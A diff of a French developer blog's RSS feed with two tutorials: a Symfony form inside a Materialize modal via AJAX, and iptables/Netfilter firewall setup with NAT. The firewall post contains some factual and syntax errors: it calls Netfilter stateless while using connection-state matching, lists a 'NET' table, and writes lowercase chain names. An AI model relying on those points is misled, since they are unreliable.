+  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;data-target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;{{ path(&amp;#39;competition-inscription&amp;#39;, {&amp;#39;id&amp;#39;: competition.id}) }}&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;data-tooltip&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;voir&amp;quot;&lt;/span&gt;
+   &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tooltipped modal-trigger btn right-align&amp;quot;&lt;/span&gt;
+   &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#modal1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;inscription&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+{% endraw %}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Et la modale correspondante:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal-content&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+
+
+    &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;modal-footer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+
+    &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Quand on clique sur le bouton d’inscription, on appelle ce script javascript:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;  &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;ready&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="c1"&gt;//On écoute le &amp;quot;click&amp;quot; sur le bouton ayant la classe &amp;quot;modal-trigger&amp;quot;&lt;/span&gt;
+&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.modal-trigger&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;click&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="c1"&gt;//On initialise les modales materialize&lt;/span&gt;
+        &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.modal&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;modal&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+        &lt;span class="c1"&gt;//On récupère l&amp;#39;url depuis la propriété &amp;quot;Data-target&amp;quot; de la balise html a&lt;/span&gt;
+        &lt;span class="nx"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;attr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;data-target&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="c1"&gt;//on fait un appel ajax vers l&amp;#39;action symfony qui nous renvoie la vue&lt;/span&gt;
+        &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="c1"&gt;//on injecte le html dans la modale&lt;/span&gt;
+            &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.modal-content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="c1"&gt;//on ouvre la modale&lt;/span&gt;
+            &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#modal1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;modal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;});&lt;/span&gt;
+    &lt;span class="p"&gt;})&lt;/span&gt;
+&lt;span class="p"&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le contrôleur est donc appelé par un appel ajax. C'est la même action qui va servir à afficher le formulaire ou à traiter la soumission. Voici l’action du contrôleur:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt;  /**&lt;/span&gt;
+&lt;span class="x"&gt; * @Method({&amp;quot;GET&amp;quot;, &amp;quot;POST&amp;quot;})&lt;/span&gt;
+&lt;span class="x"&gt; * @Route(&amp;quot;/competition/{id}/inscription&amp;quot;, name=&amp;quot;competition-inscription&amp;quot;)&lt;/span&gt;
+&lt;span class="x"&gt; * @param Request $request&lt;/span&gt;
+&lt;span class="x"&gt; */&lt;/span&gt;
+&lt;span class="x"&gt;public function inscriptionAction(Competition $competition, Request $request)&lt;/span&gt;
+&lt;span class="x"&gt;{&lt;/span&gt;
+&lt;span class="x"&gt;    $inscrit = new Inscrit();&lt;/span&gt;
+&lt;span class="x"&gt;    $form = $this-&amp;gt;createForm(InscritType::class, $inscrit);&lt;/span&gt;
+&lt;span class="x"&gt;    $form-&amp;gt;handleRequest($request);&lt;/span&gt;
+&lt;span class="x"&gt;    if ($form-&amp;gt;isSubmitted() &amp;amp;&amp;amp; $form-&amp;gt;isValid()) {&lt;/span&gt;
+&lt;span class="x"&gt;        $em = $this-&amp;gt;getDoctrine()-&amp;gt;getManager();&lt;/span&gt;
+&lt;span class="x"&gt;        $inscrit-&amp;gt;setDateInscription(new \DateTime());&lt;/span&gt;
+&lt;span class="x"&gt;        $inscrit-&amp;gt;setCompetition($competition);&lt;/span&gt;
+
+&lt;span class="x"&gt;        $em-&amp;gt;persist($inscrit);&lt;/span&gt;
+&lt;span class="x"&gt;        $em-&amp;gt;flush();&lt;/span&gt;
+&lt;span class="x"&gt;        $request-&amp;gt;getSession()-&amp;gt;getFlashbag()-&amp;gt;add(&amp;#39;success&amp;#39;, &amp;#39;Votre inscription a été enregistré.&amp;#39;);&lt;/span&gt;
+&lt;span class="x"&gt;        return $this-&amp;gt;redirectToRoute(&amp;#39;competitions&amp;#39;);&lt;/span&gt;
+&lt;span class="x"&gt;    }&lt;/span&gt;
+&lt;span class="x"&gt;    return $this-&amp;gt;render(&lt;/span&gt;
+&lt;span class="x"&gt;        //On affiche  une vue twig simple (pas de head ni rien, donc aucun héritage de template...) qui sera intégrée dans la modale.&lt;/span&gt;
+&lt;span class="x"&gt;        &amp;#39;competitions/competitionModale.html.twig&amp;#39;, array(&amp;#39;form&amp;#39; =&amp;gt; $form-&amp;gt;createView(), &amp;#39;competition&amp;#39; =&amp;gt; $competition&lt;/span&gt;
+&lt;span class="x"&gt;        )&lt;/span&gt;
+&lt;span class="x"&gt;    );&lt;/span&gt;
+&lt;span class="x"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;La vue twig est une vue très simple qui ne doit hériter de rien:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;{% raw %}
+  {{ competition.titre }}
+    &lt;span class="c"&gt;&amp;lt;!-- Il faut préciser l&amp;#39;action dans le formulaire --&amp;gt;&lt;/span&gt;
+    {{ form_start(form, {&amp;#39;action&amp;#39;: path(&amp;#39;competition-inscription&amp;#39;, { &amp;#39;id&amp;#39;: competition.id })}) }}
+    {{ form_widget(form) }}
+    {{ form_end(form) }}
+{% endraw %}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Conclusion&lt;/p&gt;
+&lt;p&gt;Comme vous le voyez, il n'y a rien de très compliqué, l'important est de bien comprendre le principe d'appel ajax pour afficher le formulaire à l'intérieur de la modale. Cette action peu être un peu longue, je vous conseille d'utiliser une icône de chargement, d'assombrir la page etc&amp;#8230; vous trouverez plein de ressources sur le web pour ça.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Benoit</dc:creator><pubDate>Wed, 02 Jan 2019 09:07:30 +0100</pubDate><guid isPermaLink="false">tag:coubiac.github.io,2019-01-02:/inserer-un-formulaire-dans-une-modale-avec-symfony-et-materializecss.html</guid><category>Dev</category><category>[PHP</category><category>Symfony</category><category>Javascript]</category></item><item><title>"Fonctionnement et paramétrage d'un firewall avec Netfilter et IPTABLES"</title><link>https://Coubiac.github.io/fonctionnement-et-parametrage-dun-firewall-avec-netfilter-et-iptables.html</link><description>&lt;h2&gt;Principe de fonctionnement&lt;/h2&gt;
+&lt;h3&gt;Netfilter vs Iptables&lt;/h3&gt;
+&lt;p&gt;Netfilter est une architecture de filtrage des paquets. Le filtrage se fait au sein du noyeau au niveau des couches basses du modèle OSI (Liaison de donnée, Réseau et Transport).&lt;/p&gt;
+&lt;p&gt;Netfilter est &lt;a href="https://fr.wikipedia.org/wiki/Protocole_sans_état"&gt;stateless&lt;/a&gt;, il n'inspecte que les entêtes des paquets. Il n'entraine pas de latence.&lt;/p&gt;
+&lt;p&gt;Netfilter est un firewall qui agit au niveau du protocole. Il fonctionne un peu comme une API: pour pouvoir interagir avec Netfilter, nous aurons donc besoin d'un « logiciel client ». Il y en a plusieurs mais IPTables est le plus connu et le plus utilisé.Vous l'aurez donc compris, &lt;strong&gt;IPTABLES n'est pas un firewall&lt;/strong&gt;. C'est un programme permettant d'interagir et paramétrer le firewall netfilter.&lt;/p&gt;
+&lt;h3&gt;Cheminement d'un paquet&lt;/h3&gt;
+&lt;p&gt;Voici un schéma materialisant le chemin que peut prendre un paquet:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="cheminement d'un paquet" src="/images/packet-life.svg"&gt;&lt;/p&gt;
+&lt;p&gt;Chaque état (rectangle rouge) représente un point de filtrage possible avec IPTABLES.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;PREROUTING&lt;/em&gt;&lt;/strong&gt;: Traite les paquets à leur arrivée. Si un paquet est à destination du système local, il sera traité par un processus local (INPUT et/ou OUTPUT). Par exemple, si le paquet est destiné au serveur apache (port 80 ou 443) installé sur notre même serveur, il sera traité par le chemin de gauche. Sinon, si nous avons activé le forwarding, le paquet empruntera le chemin de droite, c'est à dire que les règles FORWARD et POSTROUTING  seront appliquées.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;FORWARD&lt;/strong&gt;&lt;/em&gt; : Traite les paquets qui traversent le système local&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;INPUT&lt;/strong&gt;&lt;/em&gt;: Traite les paquets destinés au système local (par exemple pour accéder à un service hébergé sur le même serveur que notre pare-feu)&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;OUTPUT&lt;/strong&gt;&lt;/em&gt;: Traite les paquets qui quittent le système local&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;POSTROUTING&lt;/strong&gt;&lt;/em&gt;: Traite les paquets juste avant qu'ils sortent.&lt;/p&gt;
+&lt;h3&gt;Les Règles&lt;/h3&gt;
+&lt;p&gt;Pour décider ce que va devenir un paquet, netfilter va appliquer des règles qu'on lui aura fourni. Ces règles ont un ordre et les paquets seront testés avec chacunes des règles les unes après les autres. Si une règle correspond, le paquet sera traité et les autres règles ne seront pas utilisées. D'où l'importance de l'ordonnancement de ces règles !&lt;/p&gt;
+&lt;p&gt;&lt;img alt="traitement des règles" src="/images/regles-netfilter.svg"&gt;&lt;/p&gt;
+&lt;h4&gt;Les cibles&lt;/h4&gt;
+&lt;p&gt;Les cibles sont les actions à effectuer lorsqu'un paquet correspond au critères d'une règle. Les deux actions de base sont DROP et ACCEPT mais il existe aussi REJECT et LOG.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DROP: On rejète le paquet sans envoyer de notification à la source.&lt;/li&gt;
+&lt;li&gt;REJECT: On rejète le paquet et on retourne une erreur.&lt;/li&gt;
+&lt;li&gt;ACCEPT: Le paquet est accepté&lt;/li&gt;
+&lt;li&gt;LOG: Une info est écrite dans les logs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Voici un exemple de règle:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A INPUT -s &lt;span class="m"&gt;216&lt;/span&gt;.58.209.227 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;décomposons cette règle:&lt;/p&gt;
+&lt;p&gt;-A: on ajoute la règle (les options sont A=Ajouter, I=Insérer, D=supprimer, L=lister)&lt;/p&gt;
+&lt;p&gt;INPUT: le [point de filtrage][3]&lt;/p&gt;
+&lt;p&gt;-s 216.58.209.227: l'adresse IP source&lt;/p&gt;
+&lt;p&gt;-j DROP: l'action à effectuer sur le paquet (la cible)&lt;/p&gt;
+&lt;h4&gt;Les opérations&lt;/h4&gt;
+&lt;p&gt;Comme expliqué sur le schéma précédent, les règles sont ordonnées. Elles sont numérotées à partir de 1.&lt;/p&gt;
+&lt;p&gt;On utilise -A pour ajouter une règle:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A INPUT -s &lt;span class="m"&gt;216&lt;/span&gt;.58.209.227 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On insère une règle avec -I à la position souhaitée (position 2):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -I OUTPUT -d &lt;span class="m"&gt;216&lt;/span&gt;.58.209.227 -j DROP &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On supprime une règle avec -D&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -D OUTPUT &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On liste les règles avec -L&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# iptables -L&lt;/span&gt;
+Chain INPUT &lt;span class="o"&gt;(&lt;/span&gt;policy ACCEPT&lt;span class="o"&gt;)&lt;/span&gt;
+target    prot opt &lt;span class="nb"&gt;source&lt;/span&gt;     destination
+
+Chain FORWARD &lt;span class="o"&gt;(&lt;/span&gt;policy ACCEPT&lt;span class="o"&gt;)&lt;/span&gt;
+target    prot opt &lt;span class="nb"&gt;source&lt;/span&gt;     destination
+
+Chain OUTPUT &lt;span class="o"&gt;(&lt;/span&gt;policy ACCEPT&lt;span class="o"&gt;)&lt;/span&gt;
+target    prot opt &lt;span class="nb"&gt;source&lt;/span&gt;     destination
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On supprime toutes les règles avec -F (flush)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -F
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Les critères&lt;/h4&gt;
+&lt;p&gt;Les critères servent à spécifier une règle. Pour qu'une règle s'applique, tous les critères doivent être vérifiés. Voici les principaux critères:&lt;/p&gt;
+&lt;p&gt;-i : interface entrante&lt;/p&gt;
+&lt;p&gt;-o : interface sortante&lt;/p&gt;
+&lt;p&gt;-p : protocole de couche 4.&lt;/p&gt;
+&lt;p&gt;-s : adresse IP source&lt;/p&gt;
+&lt;p&gt;-d : adresse IP destination&lt;/p&gt;
+&lt;h5&gt;Voici quelques exemples:&lt;/h5&gt;
+&lt;p&gt;On interdit les entrées par eth0:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A INPUT -i eth0 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On interdit le forward entre eth0 et eth1:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A FORWARD -i eth0 -o eth1 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On interdit le ping (protocole ICMP):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A input -p icmp -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;Les arguments des critères&lt;/h5&gt;
+&lt;h6&gt;Pour les adresses:&lt;/h6&gt;
+&lt;p&gt;-s signifie « source » et -d signifie « destination ». On peut indiquer l'adresse IP, le nom d'hôte ou même un réseau entier (192.168.1.0/24 ou 192.168.1.0/255.255.255.0)&lt;/p&gt;
+&lt;h6&gt;Pour les ports:&lt;/h6&gt;
+&lt;p&gt;&lt;code&gt;--sport&lt;/code&gt; signifie « port source », &lt;code&gt;--dport&lt;/code&gt; signifie « port destination ». On peut indiquer un numéro, un nom, une étendue de ports ( 81:1024).&lt;/p&gt;
+&lt;p&gt;Sur cet exemple, on interdit les connexions au serveur httpd sur le port 80:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt; iptables -A input -p tcp --dport &lt;span class="m"&gt;80&lt;/span&gt; -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le point d'exclamation (!) permet de dire « tout sauf ». Dans cet exemple on interdit toutes les connexions entrantes sauf celles venant de l'adresse ip 192.168.1.10:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A INPUT -s ! &lt;span class="m"&gt;192&lt;/span&gt;.168.1.10 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Les Tables&lt;/h4&gt;
+&lt;p&gt;En plus des points de filtrage (INPUT, OUTPUT, etc..) Netfilter utilise des tables particulières qui peuvent contenir des règles spécifiques. Les tables principales tables existantes sont: FILTER, NET et MANGLE. Si on ne précise pas de nom de table, la table FILTER sera utilisée par défaut:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -L &lt;span class="c1"&gt;#affiche la liste des règles de la table FILTER&lt;/span&gt;
+
+iptables -t nat -L &lt;span class="c1"&gt;#affiche la liste des règles de la table NAT&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Exemple d'utilisation, le masquage d'IP:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Dans cet exemple, on ajoute une règle (&lt;code&gt;-A&lt;/code&gt;) sur la table « nat » (&lt;code&gt;-t nat&lt;/code&gt;), sur le point de filtrage « postrouting », c'est à dire juste avant que le paquet sorte, et on applique la règle « MASQUERADE ». C'est à dire qu'on remplace l'adresse IP source dans l'entête du paquet par l'adresse IP publique du firewall pour faire croire à la machine qui doit recevoir ce paquet qu'il a été envoyé par notre firewall.&lt;/p&gt;
+&lt;h3&gt;Le routage&lt;/h3&gt;
+&lt;p&gt;Nous allons considérer le réseau suivant:&lt;/p&gt;
+&lt;p&gt;Pour créer un routeur sous linux, il y a plusieurs étapes à suivre.&lt;/p&gt;
+&lt;h4&gt;Activer la fonctionnalité de routage&lt;/h4&gt;
+&lt;p&gt;Le routage est une fonctionnalité du noyau linux. Par défaut cette fonctionnalité est désactivée, il faut donc l'activer.&lt;/p&gt;
+&lt;p&gt;on édite le fichier &lt;code&gt;sysctl.conf&lt;/code&gt; situé dans le répertoire « etc »:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;vi /etc/sysctl.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;ensuite on repère cette ligne:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;net.ipv4.ip_forward&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;et on remplace le « 0 » par un « 1 » (on la décommente si elle est commentée):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;net.ipv4.ip_forward&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Pour activer les changements, vous pouvez rebooter votre machine ou utiliser cette commende:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sysctl -p /etc/sysctl.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Créer les règles IPTABLES&lt;/h4&gt;
+&lt;p&gt;Dans ces exemples, nous allons considérer que l'interface connectée à internet est eth0 et l'interface connectée au réseau local est eth1.&lt;/p&gt;
+&lt;p&gt;Tout ce qui provient de notre réseau local (LAN) est autorisé à traverser le routeur:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A FORWARD -i eth1 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On autorise les « paquets de réponse », autrement dit, tout ce qui vient de l'extérieur (WAN) et qui veut rentrer vers l'intérieur (LAN) et qui correspond à une réponse est autorisé:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A FORWARD -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Le masquage d'adresse IP source&lt;/h4&gt;
+&lt;p&gt;Comme vous le savez, une entête de paquet IP comporte, entre autres, l'adresse IP source et l'adresse IP destination.&lt;/p&gt;
+&lt;p&gt;L'adresse IP source est importante. En effet, sans elle, la machine qui reçoit le paquet ne sait pas à qui envoyer la réponse.&lt;/p&gt;
+&lt;p&gt;Dans notre exemple, imaginons que le PC1 envoie des paquets vers internet (pour affichier un site internet par exemple...), l'entête des paquets qu'il va envoyer vont logiquement comporter l'adresse IP source. C'est à dire, dans cet exemple l'adresse 192.168.1.20. &lt;/p&gt;
+&lt;p&gt;Le problème qui se pose ici est que cette adresse n'est pas une adresse « routable » sur internet. Le site internet qui reçoit les paquets ne pourra donc pas répondre à une adresse locale.&lt;/p&gt;
+&lt;p&gt;Voici la solution:&lt;/p&gt;
+&lt;p&gt;Nous allons remplacer l'adresse IP source du paquet par l'adresse ip publique de notre routeur/firewall. De cette manière le site internet saura à qui envoyer la réponse.&lt;/p&gt;
+&lt;p&gt;Nous pouvons le faire de deux façon différentes. En utilisant la règle « MASQUERADE » ou en utilisant « SNAT ».&lt;/p&gt;
+&lt;h5&gt;MASQUERADE&lt;/h5&gt;
+&lt;p&gt;cette solution est surtout adaptée quand l'adresse IP de l'interface WAN (eth0 dans notre exemple) n'est pas une adresse IP fixe. Pour chaque paquet, iptables va rechercher l'IP de l'interface eth0 et remplacer l'IP source du paquet par celle-ci:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A POSTROUTING -t nat -o eth0 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h5&gt;SNAT&lt;/h5&gt;
+&lt;p&gt;Cette solution est à utiliser quand l'adresse ip publique est fixe. Même si la solution « masquerade » fonctionne avec une adresse ip fixe, la solution SNAT est plus optimisée car iptables n'a pas à rechercher l'adresse ip de l'interface WAN à chaque paquet (oui oui, il le fait à chaque paquet, n'oubliez pas que netfilter est « stateless »)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;iptables -A POSTROUTING -t nat -o eth0 -j SNAT --to-source &lt;span class="m"&gt;89&lt;/span&gt;.63.83.128 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;Sauvegarder la configuration&lt;/h3&gt;
+&lt;p&gt;Quand vous ajoutez des règles iptables, celles-ci sont stockées en mémoire. Elles ne seront donc actives que jusqu'au prochain reboot. C'est pour cette raison qu'il faut penser à sauvegarder votre configuration. Pour le faire, il y a plusieurs solutions en fonction de la distribution linux que vous utilisez.&lt;/p&gt;
+&lt;h4&gt;RedHat / CentOS&lt;/h4&gt;
+&lt;p&gt;en root:&lt;/p&gt;
+&lt;p&gt;/sbin/service iptables save&lt;/p&gt;
